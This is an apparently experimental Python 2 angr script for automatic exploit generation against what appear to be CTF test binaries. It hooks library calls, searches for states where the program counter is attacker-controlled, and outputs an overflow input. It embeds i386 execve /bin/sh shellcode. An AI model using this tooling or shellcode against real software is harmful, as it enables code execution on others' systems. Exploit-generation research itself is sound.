# -*- coding: utf-8 -*-
import os
import sys
import angr
from angr import sim_options as so
import staticScan
import logging
import time
import claripy
import struct

l = logging.getLogger("insomnihack.simple_aeg")
l.setLevel(logging.DEBUG)
#global loop_count
loop_count=0
# shellcraft i386.linux.sh
str_bvs=''
def read1(self):
    #argu1,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+12,4),cast_to=str))
    length,=struct.unpack('=i',self.se.eval(self.memory.load(self.regs.esp+8,4),cast_to=str)) #big-endium transform
    print 'length=',hex(length)
    #print self.memory.load(self.regs.esp+8,4)
    addr,=struct.unpack('=i',self.se.eval(self.memory.load(self.regs.esp+4,4),cast_to=str))
    #print self.memory.load(self.regs.esp+4,4)
    #print self.memory.load(self.regs.esp,4)
    #print self.regs.esp
    #str1=claripy.BVS('str1',length*8)#BVS
    str1=claripy.BVV('\xf5'*length,length*8)
    self.memory.store(addr,str1)
    self.regs.eax=0x100
    #self.regs.pc=self.regs.r14
    return
def get_str_bvs(state):
    str1=claripy.BVS('str1',256*8)#BVS
    for byte in str1.chop(8):
        state.add_constraints(byte != '\x00')
    return str1

def read2(self):
    global str_bvs
    length,=struct.unpack('=i',self.se.eval(self.memory.load(self.regs.esp+8,4),cast_to=str)) #big-endium transform
    print 'length=',hex(length)
    addr,=struct.unpack('=i',self.se.eval(self.memory.load(self.regs.esp+4,4),cast_to=str))
    print 'str address=',hex(addr)
    print 'symbolic string = ',repr(str_bvs)
    self.memory.store(addr,str_bvs)
    self.regs.eax=0x100
    return

def null_constraints(self):
    length=self.se.eval(self.memory.load(self.regs.ebp-0x9,4),cast_to=str)
    print 'length=',repr(length)
    addr,=struct.unpack('=i',self.se.eval(self.memory.load(self.regs.ebp+8,4),cast_to=str))
    print 'str address=',hex(addr)
    str1=self.memory.load(addr,0x100)
    for byte in str1.chop(8):
        self.add_constraints(byte != '\x00')
    print 'symbolic string = ',repr(self.se.eval(str1,cast_to=str))
    print 'eax=',self.regs.eax
    return
def hook_input_addr(self):
    self.mem[self.regs.esp].uint32_t=0x800000
    aa=self.memory.load(0x800000,4)
    if self.se.symbolic(aa):
        print "Yes it is symbolic!!!!!"
    return 

def get_len(self):
    print '!!!',self.memory.load(self.regs.esp+8,4)
    return

def get_char(self):
    length=self.se.eval(self.memory.load(self.regs.ebp-0x9,4),cast_to=str)
    print 'strlen()=',repr(length)
    addr,=struct.unpack('=i',self.se.eval(self.memory.load(self.regs.ebp+8,4),cast_to=str))
    print 'addr=',hex(addr)
    ch=self.se.eval(self.memory.load(addr,0x200),cast_to=str)
    print 'Input_char is=',repr(ch)
    print 'len(ch)=',len(ch)
    #print 'eax=',self.se.eval(self.regs.eax)
    #self.memory.store(self.regs.ebp-16,'\x31')
    #ch=self.se.eval(self.memory.load(self.regs.ebp-16,1),cast_to=str)
    #print 'Input_char is=',repr(ch)
    return
def return_0(self):
    return
def len2(self):
    self.regs.eax=0x100
    return
def get_eax(self):
    print 'eax=',self.regs.eax
    ch=self.se.eval(self.memory.load(self.regs.eax,0x200),cast_to=str)
    print 'Input_char is=',repr(ch)
    return

def get_char2(self):
    str2=self.se.eval(self.memory.load(self.regs.ebp-0x13,0x200),cast_to=str)
    print 'Str on stack = ',repr(str2)
    print 'ebp=',self.regs.ebp
    ret_addr,=struct.unpack('=i',self.se.eval(self.memory.load(self.regs.ebp+4,4),cast_to=str))
    ret_addr2=self.se.eval(self.memory.load(self.regs.ebp+4,4),cast_to=str)
    print 'ret_addr=',repr(ret_addr2)
    return
def get_ret_addr(self):
    ret_addr,=struct.unpack('=i',self.se.eval(self.memory.load(self.regs.ebp+4,4),cast_to=str))
    print 'ret_addr=',hex(ret_addr)
    return
def get_strcpy_argv(self):
    s_addr,=struct.unpack('=i',self.se.eval(self.memory.load(self.regs.esp+4,4),cast_to=str))
    print 'source_addr=',hex(s_addr)
    d_addr,=struct.unpack('=i',self.se.eval(self.memory.load(self.regs.ebp,4),cast_to=str))
    print 'dest_addr=',hex(d_addr)
    str1=self.memory.load(s_addr,0x100)
    print 'Length of str1=',len(str1.chop(8))

    self.memory.store(d_addr,str1)
    return

class simple_aeg(object):
    def __init__(self, binary, shellcode='6a68682f2f2f73682f62696e89e331c96a0b5899cd80', sigfile='2333.sig', pgBase=0x08048000,user_pc=0x61616161):
        self.binary = binary
        self.shellcode = shellcode#.decode('hex')#
        self.sigfile = sigfile
        self.pgBase = pgBase
        print hex(user_pc)
        self.user_pc=user_pc




    def fully_symbolic(self, state, variable):
        '''
        check if a symbolic variable is completely symbolic
        '''

        for i in range(state.arch.bits):
            if not state.se.symbolic(variable[i]):
                return False

        return True

    def check_continuity(self, address, addresses, length):
        '''
        dumb way of checking if the region at 'address' contains 'length' amount of controlled
        memory.
        '''

        for i in range(length):
            if not address + i in addresses:
                return False

        return True

    def find_symbolic_buffer(self, state, length):
        '''
        dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
        control
        '''

        # get all the symbolic bytes from stdin
        stdin_file = state.posix.get_file(0)

        sym_addrs = [ ]
        for var in stdin_file.variables():
            sym_addrs.extend(state.memory.addrs_for_name(var))

        for addr in sym_addrs:
            if self.check_continuity(addr, sym_addrs, length):
                yield addr

    def run(self,avoid_arr):
        global loop_count
        p = angr.Project(self.binary)
        scan = staticScan.StaticScan(self.binary, self.sigfile, self.pgBase)
        for i in  scan.well_printf():
            tem = i
            if tem == None:
                continue
            addr=int(tem[0] ,16)
            p.hook(addr , tem[1])
        #hook
        #p.hook(0x08048383,read2,length=5)#!!!!!!!!!!!   way1  hook setbuf=0x080489D6
        #p.hook(0x08048388,null_constraints)   # way2  add_constraints  input char != \x00
        p.hook(0x080483BF,hook_input_addr)   # way3,替换输入地址为0x800000，这里已经提前设置约束
        #p.hook(0x080482C8,get_eax)
        p.hook(0x080482D6,get_char)
        #p.hook(0x080482FE,return_0,length=5)
        p.hook(0x080482C8,len2,length=5)             #strlen!
        p.hook(0x8048321,get_char2)
        p.hook(0x8050310,get_ret_addr)
        p.hook(0x080482E3,get_strcpy_argv,length=5)  #strcpy!
        #irsb = p.factory.block(0x0804836C).vex
        #irsb.pp()
        #p.hook(0x08048388,get_len)
        print 'here'

        #project
        binary_name = os.path.basename(self.binary)
        extras = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
        self._es = p.factory.entry_state(add_options=extras)
        str_ptr = 0x800000
        content = self._es.memory.load(str_ptr, 0x100)
        for byte in content.chop(8):
            self._es.add_constraints(byte != '\x00')
        #str_bvs=get_str_bvs(self._es)
        #str_bvs=claripy.BVS('str_bvs',256*8)#BVS
        #for byte in str_bvs.chop(8):
        #    self._es.add_constraints(byte != '\x00')
        sm = p.factory.simgr(self._es, save_unconstrained=True)

        # find a bug giving us control of PC
        start_time = time.time()
        l.info("looking for vulnerability in '%s'", binary_name)
        exploitable_state = None
        while exploitable_state is None:
            #print hex(sm.active[0].addr)
            sm.step()
            if len(sm.active)==0:
                print 'No way111!!!'
                if len(sm.unconstrained)>0:
                    print 'unconstrained!!!'#,hex(sm.unconstrained[0].addr)
                if len(sm.deadended)>0:
                    print 'deadended!!!',hex(sm.deadended[0].addr)
                #raw_input()
            

            #print '!!!!!!!!!!!!!!!'
            if len(sm.active)>0:
                print hex(sm.active[0].history.addr)
                print 'son=',hex(sm.active[0].addr)
                #for i in range(len(sm.active)):
                #    if sm.active[i].addr==0x08048388:
                #        print 'find a read!!! set the constraints!!!'
                #        str1=sm.active[i].memory.load(sm.active[i].regs.ebp-0x104,0x100)
                #        for byte in str1.chop(8):
                #            sm.active[i].add_constraints(byte != '\x00')
                #        sm.active[i].regs.eax=0x100
                #        print repr(sm.active[i].se.eval(str1))
            if len(sm.active)>1:
                print '2'
                if sm.active[0].addr==0x8048410 and loop_count<0x801d*2:    #!!!!!!   just want to continue loop
                    tmp=sm.active[0]
                    sm.active[0]=sm.active[1]
                    sm.active[1]=tmp
                    loop_count+=1
                    print loop_count
                #print '!!!!!!!!!!!!!!!'
                #print hex(sm.active[0].history.addr),'->',hex(sm.active[0].addr),'  ',hex(sm.active[1].addr)
                bl = p.factory.block(sm.active[0].history.addr)#self._es.se.eval(self._es.regs.pc))
                jump_arr=bl.vex.constant_jump_targets_and_jumpkinds
                for a,b in jump_arr.iteritems():
                    if (a>0) and (a<sm.active[0].history.addr) and (b=='Ijk_Boring') and (len(sm.active)>1):
                        print 'find a loop!!!!!!!!!!!     ',hex(sm.active[0].history.addr),'->',hex(a)
                        count=len(sm.active)
                        print 'a=',hex(a)
                        i=0
                        while i<count:
                            if sm.active[i].addr!=a:
                                del sm.active[i]
                                i=i-1
                                count=count-1
                            i=i+1
                        #print hex(a)
                        #print 'length of active =',len(sm.active)
            sm.move(from_stash='active',to_stash='deadended',filter_func=lambda s: s.addr in avoid_arr)
            if len(sm.unconstrained) > 0:
                end_time=time.time()
                t=end_time-start_time
                print '**********Find a bug!!!  Time=',t,'**********'
                l.info("found some unconstrained states, checking exploitability")
                for u in sm.unconstrained:
                    if self.fully_symbolic(u, u.regs.pc):
                        exploitable_state = u
                        break

                # no exploitable state found, drop them
                sm.drop(stash='unconstrained')
            if len(sm.active)==0:
                print 'No way222!!!'
                #raw_input()
            

        l.info("found a state which looks exploitable")
        ep = exploitable_state

        assert ep.se.symbolic(ep.regs.pc), "PC must be symbolic at this point"

        l.info("attempting to create exploit based off state")

        # keep checking if buffers can hold our shellcode
        for buf_addr in self.find_symbolic_buffer(ep, 4):
            l.info("found symbolic buffer at %#x", buf_addr)
            #memory = ep.memory.load(buf_addr, len(self.shellcode))
            #sc_bvv = ep.se.BVV(self.shellcode)

            # check satisfiability of placing shellcode into the address
            if ep.satisfiable(extra_constraints=(ep.regs.pc == self.user_pc,)):
                l.info("found buffer for shellcode, completing exploit")
                #ep.add_constraints(memory == sc_bvv)
                #l.info("pointing pc towards shellcode buffer")
                ep.add_constraints(ep.regs.pc == self.user_pc)
                break
        else:
            l.warning("couldn't find a symbolic buffer for our shellcode! exiting...")
            return None

        filename = '%s-exploit' % binary_name
        exp = ep.posix.dumps(0)
        l.info("[*]Explot Found!")
        return exp

#rr=simple_aeg(binary='./_01_cb',shellcode="\xb8aaaa\xff\xd0")
#data=rr.main()
#f=open('exp.txt','wb')
#f.write(data)
#f.close()
test=simple_aeg(binary='/usr/downloads/test/testcase/robo_change/work/binary/_86_pwn06')
avoid_arr=[0x8048493,0x8048496,0x8048499,0x80484A8,0x80484A8,0x804849C,0x804849F,0x80484A5]
test.run(avoid_arr)



'''
1.hook 0x08048383处的call read，如果是符号输入的话，都是用的\x00，这样strcpy不能触发溢出
2.设置一些avoid的地址
3.遇到循环分支时，尽量选择能让循环继续的路径（往回跳）
4.手动改变优先级，使循环继续

问题：
    为什么只要给内存数据添加限制条件后，走到函数库里就会停止，找不到后面的路。我只能手动替换函数库（strlen/strcpy），使执行流继续

'''


'''
    i=0
    for byte in str1.chop(8):
        print repr(byte)
        print '1'
        if byte!='\x00':
            print 'c'
            i+=1
    print 'Copy_length=',i+1
'''
